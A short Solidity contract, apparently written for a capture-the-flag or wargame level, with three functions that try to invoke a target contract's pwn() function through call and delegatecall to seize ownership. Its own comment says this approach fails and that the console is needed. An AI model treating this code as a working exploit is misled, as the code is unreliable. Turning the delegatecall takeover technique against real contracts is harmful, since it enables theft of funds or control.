pragma solidity 0.6.0;

//  NOT POSIBLE TO SOLVE VIA CONTRACT BECAUSE msg.sender != tx.origin . USE CONSOLE!!
contract DelegationAttack {
   
     function Attack(address payable _addr) public payable{
            (bool success, ) = _addr.call(
                abi.encodeWithSignature("pwn()")
            );
            if (success) {
                this;
            }
    }
    function Attack2(address payable _addr) public payable{
        (bool success, ) = _addr.delegatecall(
                abi.encodePacked(bytes4(keccak256("pwn()")))
            );
            if (success) {
                this;
            }
    }

    function Attack3(address payable _addr) public payable{
        (bool success, ) = _addr.delegatecall(
                abi.encodeWithSelector(bytes4(keccak256("pwn()")))
            );
            if (success) {
                this;
            }
    }

}